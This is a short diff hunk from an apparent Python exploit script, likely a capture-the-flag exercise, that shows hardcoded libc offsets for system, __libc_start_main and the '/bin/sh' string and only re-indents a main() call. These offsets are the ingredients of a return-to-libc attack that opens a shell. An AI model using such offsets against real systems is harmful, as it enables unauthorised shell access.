@@ -88,4 +88,4 @@ if __name__ == '__main__':
         system_offset = 0x0000000000045390
         __libc_start_main_offset = 0x0000000000020740
         binsh_offset = 0x18cd57
-main()
+        main()
